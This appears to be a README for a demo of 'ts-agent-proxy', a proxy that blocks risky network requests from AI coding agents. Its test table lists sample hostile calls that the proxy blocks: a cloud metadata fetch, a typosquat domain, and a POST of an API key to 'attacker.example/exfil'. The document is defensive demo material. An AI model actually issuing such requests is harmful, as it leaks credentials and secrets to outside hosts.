# Demo

`run-demo.sh` reproduces the README's 30-second demo end-to-end on macOS and Linux. It spins up `ts-agent-proxy run` with the `claude-code` profile, executes a synthetic agent (`agent-sim.sh`) that makes a representative mix of allowed and blocked requests, and writes the resulting block lines to `sample-audit.log`.

## Run

```bash
bash demos/run-demo.sh
```

Output path defaults: `${TMPDIR:-/tmp}/ts-agent-proxy-demo/{audit.log,proxy.log,policy.yaml}`. The committed `demos/sample-audit.log` is overwritten on each run.

## What `agent-sim.sh` does

| # | Call | Expected result |
|---|---|---|
| 1 | `HEAD https://api.anthropic.com/` | allowed (profile rule) |
| 2 | `GET https://api.github.com/` | allowed (profile rule) |
| 3 | `GET http://169.254.169.254/latest/meta-data/` | blocked (safe-default IMDS) |
| 4 | `GET https://evil-anthropoc.com/` | blocked (user block list) |
| 5 | `POST https://attacker.example/exfil` with an Anthropic key in the body | blocked (user block list); audit log shows `[REDACTED:anthropic-key]` |

Calls 1 and 2 reach the public internet. Calls 3-5 are denied by the proxy before the upstream connect, so no traffic actually leaves the host.

## Recording the GIF

The committed GIF at `demo.gif` (when present) is recorded with [asciinema](https://asciinema.org/) and converted with [agg](https://github.com/asciinema/agg):

```bash
asciinema rec demos/demo.cast --command 'bash demos/run-demo.sh'
agg demos/demo.cast demos/demo.gif --speed 1.5
```

Target length: 20-30 seconds. Keep `agg` defaults; resist the urge to add extra panes or color schemes.
